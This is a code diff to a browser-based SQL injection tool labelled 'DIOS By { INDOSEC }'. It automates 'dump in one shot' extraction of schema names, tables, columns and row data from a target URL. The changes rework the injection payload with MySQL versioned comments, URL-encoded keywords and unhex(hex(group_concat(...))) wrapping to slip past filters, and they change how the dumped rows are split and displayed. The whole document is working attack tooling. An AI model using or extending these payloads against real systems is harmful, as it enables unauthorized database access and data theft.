@@ -9,8 +9,6 @@ $(document).ready(function () {
     let res_thead = '<thead class="bg-gray-50" id="thead_template"></thead>'
     let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'
 
-    
-
     document.title = "DIOS By { INDOSEC }";
 
     function importcss(link) {
@@ -39,7 +37,7 @@ $(document).ready(function () {
     importcss("https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css")
 
     function PayloadConcat(string) {
-        return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},/*!50000gROup_cONcat(${string}),${stringtohex("</inject> <!--")})*/`
+        return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
     }
 
     function request(url) {
@@ -119,6 +117,7 @@ $(document).ready(function () {
 
         $("#showtable").hide()
         $("#showcolum").hide()
+
         $("#data").html('')
 
         urlinject = urlinject.replace('{::}', PayloadConcat('schema_name'))
@@ -132,6 +131,8 @@ $(document).ready(function () {
     async function viewDatabase() {
 
         $("#showtable").hide()
+        $("#showcolum").hide()
+
         let splitdb = databases.split(",")
         let number = 1
 
@@ -268,7 +269,7 @@ $(document).ready(function () {
     }
 
     async function setData(table) {
-        columns_select = columns.replace(/,/g, `,${stringtohex('{:::}')},`)
+        columns_select = columns.replace(/,/g, `,${stringtohex('{:::}')},`) + ',' + stringtohex('(:::)')
 
         let urlinjection = urls
         urlinjection = urlinjection.replace('{::}', PayloadConcat(columns_select))
@@ -280,16 +281,9 @@ $(document).ready(function () {
     }
 
     async function viewData() {
-        let splitData = dataTable.split(",")
-
+        let splitData = dataTable.split("(:::)")
         for (let index = 0; index < splitData.length; index++) {
             $("#tbody_template").append("<tr>")
-            
-            // if (splitData[index].search(/^[^\s]+(\s+[^\s]+)*$/) > 0) {
-            //     console.log(splitData[index])
-            // }
-            // // console.log(splitData[index])
-
             let splitDatacol = splitData[index].split("{:::}")
 
             splitDatacol.forEach(dataCol => {
@@ -304,3 +298,4 @@ $(document).ready(function () {
     }
     setUrl()
 });
+
